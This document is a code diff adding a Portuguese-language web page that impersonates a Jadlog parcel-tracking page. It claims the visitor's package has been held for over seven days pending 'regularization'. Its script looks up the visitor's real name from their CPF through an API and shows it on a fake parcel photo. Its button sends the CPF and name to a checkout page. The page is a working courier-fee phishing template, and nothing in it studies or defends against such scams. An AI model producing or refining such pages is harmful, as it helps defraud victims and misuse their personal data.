@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Acompanhe seu pedido | Jadlog</title>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&family=Sora:wght@400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --red: #E71B35;
+      --red-soft: #fce8ec;
+      --green: #138a4b;
+      --green-soft: #eaf7ef;
+      --ink: #3a3d45;
+      --muted: #6f7279;
+      --line: #eceef1;
+      --soft-line: #f3f4f6;
+      --page: #fafafa;
+      --surface: #ffffff;
+    }
+    * { box-sizing: border-box; }
+    html, body { margin: 0; min-height: 100%; }
+    body {
+      background: var(--page);
+      color: var(--ink);
+      font-family: 'Manrope', Arial, sans-serif;
+      letter-spacing: 0;
+    }
+    .page { width: 100%; min-height: 100vh; padding-bottom: 90px; }
+    .topbar {
+      height: 82px;
+      background: var(--surface);
+      border-bottom: 1px solid var(--line);
+      display: flex;
+      align-items: center;
+    }
+    .topbar-inner {
+      width: min(100% - 40px, 960px);
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+    .brand { display: flex; align-items: center; min-width: 0; }
+    .brand-mark { width: 100px; height: 38px; object-fit: contain; object-position: left center; }
+    .secure { display: flex; align-items: center; gap: 7px; color: var(--muted); font-size: 12px; font-weight: 700; white-space: nowrap; }
+    .secure svg { width: 19px; height: 19px; color: var(--green); }
+    main { width: min(100% - 40px, 960px); margin: 24px auto 0; }
+    .summary {
+      background: var(--surface);
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 5px 18px rgba(25, 30, 40, .035);
+    }
+    .summary-head { display: flex; align-items: flex-start; justify-content: space-between; gap: 24px; }
+    .eyebrow { margin: 0 0 5px; color: var(--muted); font-size: 11px; font-weight: 700; text-transform: uppercase; }
+    .recipient { margin: 0; font-family: 'Sora', sans-serif; font-size: 23px; line-height: 1.25; font-weight: 600; text-transform: uppercase; }
+    .cpf { margin: 6px 0 0; color: var(--muted); font-size: 14px; }
+    .found { border: 1px solid #c8e8d4; background: var(--green-soft); color: var(--green); border-radius: 999px; padding: 6px 10px; font-size: 10px; font-weight: 700; }
+    .progress { position: relative; display: grid; grid-template-columns: repeat(4, 1fr); margin: 25px 2px 0; }
+    .progress::before, .progress::after { content: ''; position: absolute; top: 7px; left: 8%; right: 8%; height: 2px; border-radius: 8px; }
+    .progress::before { background: #edf0f4; }
+    .progress::after { right: 50%; background: var(--red); }
+    .step { position: relative; z-index: 1; text-align: center; font-size: 10px; font-weight: 600; color: var(--muted); }
+    .dot { width: 14px; height: 14px; margin: 0 auto 8px; border-radius: 50%; background: var(--line); border: 3px solid var(--line); display: grid; place-items: center; }
+    .step.done .dot { width: 16px; height: 16px; margin-top: -1px; margin-bottom: 7px; color: var(--surface); background: var(--red); border-color: var(--red-soft); }
+    .dot svg { width: 8px; height: 8px; }
+    .status-grid { border-top: 1px solid var(--line); margin-top: 18px; padding-top: 16px; display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 24px; }
+    .status-label { color: var(--muted); font-size: 11px; margin-bottom: 4px; }
+    .status-value { font-family: 'Sora', sans-serif; font-size: 14px; line-height: 1.4; font-weight: 600; text-transform: uppercase; }
+    .status-unit { text-align: right; }
+    .history-title { margin: 24px 3px 13px; font-family: 'Sora', sans-serif; font-size: 17px; font-weight: 600; }
+    .timeline { position: relative; padding-left: 34px; }
+    .timeline::before { content: ''; position: absolute; top: 14px; bottom: 17px; left: 7px; width: 1px; background: var(--line); }
+    .event { position: relative; background: transparent; border: 0; border-bottom: 1px solid var(--line); border-radius: 0; padding: 15px 0 17px; margin: 0; box-shadow: none; }
+    .event.current { border-color: var(--line); }
+    .timeline-dot { position: absolute; left: -33px; top: 19px; width: 14px; height: 14px; border-radius: 50%; background: var(--surface); border: 3px solid var(--red); box-shadow: 0 0 0 3px var(--red-soft); }
+    .event-row { display: grid; grid-template-columns: 24px minmax(0, 1fr); gap: 12px; align-items: start; }
+    .event-icon { width: 22px; height: 22px; display: grid; place-items: center; color: var(--red); background: var(--red-soft); border-radius: 50%; }
+    .event-icon svg { width: 13px; height: 13px; }
+    .event h3 { margin: 0 0 4px; font-family: 'Sora', sans-serif; font-size: 13px; line-height: 1.4; font-weight: 600; }
+    .event p { margin: 0; color: var(--muted); font-size: 11px; line-height: 1.5; }
+    .order-photo { margin-top: 24px; }
+    .order-photo h2 { margin: 0 0 13px; font-family: 'Sora', sans-serif; font-size: 17px; font-weight: 600; }
+    .order-photo-frame { position: relative; width: min(100%, 420px); margin: 0 auto; overflow: hidden; border: 1px solid var(--line); border-radius: 16px; background: var(--surface); box-shadow: 0 5px 18px rgba(25, 30, 40, .035); }
+    .order-photo-frame img { display: block; width: 100%; height: auto; object-fit: contain; }
+    .order-recipient { position: absolute; left: 47%; bottom: 36%; width: calc(100% - 86px); transform: translateX(-50%); color: #17191f; text-align: center; }
+    .order-recipient-name { margin: 0; color: inherit; font-family: 'Sora', sans-serif; font-size: 14px; line-height: 1.4; font-weight: 600; text-transform: uppercase; overflow-wrap: anywhere; }
+    .bottom-action { position: fixed; z-index: 20; left: 0; right: 0; bottom: 0; background: color-mix(in srgb, var(--surface) 94%, transparent); border-top: 1px solid var(--line); padding: 12px max(20px, calc((100vw - 960px) / 2)); backdrop-filter: blur(12px); }
+    .details-button { width: 100%; min-height: 48px; border: 0; border-radius: 10px; color: var(--surface); background: var(--red); font-family: 'Sora', sans-serif; font-size: 14px; font-weight: 600; cursor: pointer; transition: filter .18s ease, transform .18s ease; }
+    .details-button:hover { filter: brightness(.94); }
+    .details-button:active { transform: translateY(1px); }
+    @media (max-width: 640px) {
+      .page { padding-bottom: 72px; }
+      .topbar { height: 62px; }
+      .topbar-inner, main { width: calc(100% - 28px); }
+      .topbar-inner { gap: 12px; }
+      .brand-mark { width: 100px; height: 38px; }
+      .secure { gap: 5px; font-size: 9px; }
+      .secure svg { width: 15px; height: 15px; }
+      main { margin-top: 13px; }
+      .summary { border-radius: 14px; padding: 16px; }
+      .summary-head { align-items: flex-start; gap: 10px; }
+      .summary-head > div { min-width: 0; }
+      .recipient { font-size: 15px; line-height: 1.35; overflow-wrap: anywhere; }
+      .cpf { font-size: 12px; }
+      .found { flex: 0 0 auto; margin-top: 16px; padding: 5px 8px; font-size: 9px; }
+      .status-grid { margin-top: 14px; padding-top: 13px; gap: 12px; }
+      .status-label { font-size: 10px; }
+      .status-value { font-size: 12px; }
+      .progress { margin: 20px -4px 0; }
+      .step { font-size: 9px; }
+      .history-title { margin-top: 18px; font-size: 15px; }
+      .timeline { padding-left: 32px; }
+      .timeline::before { left: 7px; top: 14px; bottom: 16px; }
+      .event { padding: 14px 0 16px; }
+      .timeline-dot { left: -31px; top: 18px; }
+      .event-row { gap: 11px; }
+      .event h3 { font-size: 12px; overflow-wrap: anywhere; }
+      .event p { font-size: 10px; }
+      .order-photo { margin-top: 18px; }
+      .order-photo h2 { margin-bottom: 10px; font-size: 15px; }
+      .order-photo-frame { width: min(100%, 260px); border-radius: 14px; }
+      .order-recipient { left: 47%; bottom: 36%; width: calc(100% - 52px); }
+      .order-recipient-name { font-size: 12px; }
+      .bottom-action { padding: 10px 14px; }
+      .details-button { min-height: 44px; font-size: 13px; }
+    }
+    @media (prefers-reduced-motion: reduce) { .details-button { transition: none; } }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <header class="topbar">
+      <div class="topbar-inner">
+        <div class="brand"><img class="brand-mark" src="{{HEADER_LOGO_URL}}" alt="Logo" /></div>
+        <div class="secure">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z"/><path d="m9 12 2 2 4-4"/></svg>
+          <span>CONSULTA SEGURA</span>
+        </div>
+      </div>
+    </header>
+
+    <main>
+      <section class="summary">
+        <div class="summary-head">
+          <div>
+            <p class="eyebrow">Destinatário</p>
+            <h1 class="recipient" id="nomeDisplay">CLIENTE JADLOG</h1>
+            <p class="cpf" id="cpfDisplay">***.***.***-**</p>
+          </div>
+          <span class="found">LOCALIZADO</span>
+        </div>
+
+        <div class="progress" aria-label="Andamento da entrega">
+          <div class="step done"><div class="dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="m5 12 4 4L19 6"/></svg></div><span>Identificado</span></div>
+          <div class="step done"><div class="dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="m5 12 4 4L19 6"/></svg></div><span>Na base</span></div>
+          <div class="step"><div class="dot"></div><span>Em rota</span></div>
+          <div class="step"><div class="dot"></div><span>Entregue</span></div>
+        </div>
+
+        <div class="status-grid">
+          <div><div class="status-label">Status atual</div><div class="status-value">Retido a mais de 7 dias</div></div>
+          <div class="status-unit"><div class="status-label">Unidade</div><div class="status-value">São Paulo, SP</div></div>
+        </div>
+      </section>
+
+      <h2 class="history-title">Histórico do pedido</h2>
+      <section class="timeline">
+        <article class="event">
+          <span class="timeline-dot"></span>
+          <div class="event-row"><span class="event-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m21 8-9 5-9-5"/><path d="m3 8 9-5 9 5v8l-9 5-9-5Z"/><path d="M12 13v8"/><path d="m7.5 5.5 9 5"/></svg></span><div><h3>Pedido enviado pelo remetente</h3><p>O pedido foi enviado pelo remetente para a transportadora.</p></div></div>
+        </article>
+        <article class="event">
+          <span class="timeline-dot"></span>
+          <div class="event-row"><span class="event-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 10c0 5-8 12-8 12S4 15 4 10a8 8 0 1 1 16 0Z"/><circle cx="12" cy="10" r="2.5"/></svg></span><div><h3>Pedido recebido na base de São Paulo</h3><p>O pedido foi recebido e registrado na unidade logística.</p></div></div>
+        </article>
+        <article class="event current">
+          <span class="timeline-dot"></span>
+          <div class="event-row"><span class="event-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m21 8-9 5-9-5"/><path d="m3 8 9-5 9 5v8l-9 5-9-5Z"/><path d="M12 13v8"/><path d="m7.5 5.5 9 5"/></svg></span><div><h3>Pedido Retido Aguardando Regularização</h3><p>O pedido está retido há mais de 7 dias na unidade logística.</p></div></div>
+        </article>
+      </section>
+
+      <section class="order-photo" aria-labelledby="orderPhotoTitle">
+        <h2 id="orderPhotoTitle">Foto do pedido retido</h2>
+        <div class="order-photo-frame">
+          <img src="/assets/pedido-retido-final.png" alt="Pedido retido com etiqueta de transporte" />
+          <div class="order-recipient" aria-label="Destinatário consultado">
+            <p class="order-recipient-name" id="orderRecipientName">CLIENTE JADLOG</p>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <div class="bottom-action"><button class="details-button" type="button" onclick="verDetalhes()">Ver detalhes</button></div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const rawCpf = (params.get('cpf') || sessionStorage.getItem('fl_cpf') || '').replace(/\D/g, '').slice(0, 11);
+    const storedCpf = sessionStorage.getItem('fl_nome_cpf') || '';
+    const storedName = storedCpf === rawCpf ? (sessionStorage.getItem('fl_nome') || '') : '';
+    const nomeParam = params.get('nome') || storedName;
+    const nomeEl = document.getElementById('nomeDisplay');
+    const orderRecipientNameEl = document.getElementById('orderRecipientName');
+    const cpfEl = document.getElementById('cpfDisplay');
+
+    function titleCase(value) {
+      const minors = ['de', 'da', 'do', 'das', 'dos', 'e', 'a', 'o'];
+      return value.toLowerCase().split(/\s+/).filter(Boolean).map((word, index) =>
+        index === 0 || !minors.includes(word) ? word.charAt(0).toUpperCase() + word.slice(1) : word
+      ).join(' ');
+    }
+
+    function maskedCpf(value) {
+      if (value.length !== 11) return '***.***.***-**';
+      return `***.***.***-${value.slice(-2)}`;
+    }
+
+    function setName(value) {
+      if (!value) return;
+      const formatted = titleCase(value);
+      nomeEl.textContent = formatted;
+      orderRecipientNameEl.textContent = formatted.toUpperCase();
+      sessionStorage.setItem('fl_nome', formatted);
+      sessionStorage.setItem('fl_nome_cpf', rawCpf);
+    }
+
+    cpfEl.textContent = maskedCpf(rawCpf);
+    if (rawCpf.length === 11) sessionStorage.setItem('fl_cpf', rawCpf);
+    setName(nomeParam);
+
+    async function loadCustomer() {
+      if (nomeParam || !rawCpf) return;
+      try {
+        const response = await fetch(`/api/public/cpf?cpf=${encodeURIComponent(rawCpf)}`);
+        const data = await response.json();
+        if (!response.ok) throw new Error(data?.error || 'CPF não localizado');
+        const foundName = data?.nome || data?.dadosPessoais?.nome;
+        if (!foundName) throw new Error('CPF não localizado');
+        setName(foundName);
+      } catch (_) {
+        nomeEl.textContent = 'CPF não localizado';
+        orderRecipientNameEl.textContent = 'CPF NÃO LOCALIZADO';
+      }
+    }
+
+    function verDetalhes() {
+      const currentName = nomeEl.textContent || '';
+      window.location.href = `/checkout?cpf=${encodeURIComponent(rawCpf)}&nome=${encodeURIComponent(currentName)}`;
+    }
+
+    loadCustomer();
+  </script>
+</body>
+</html>
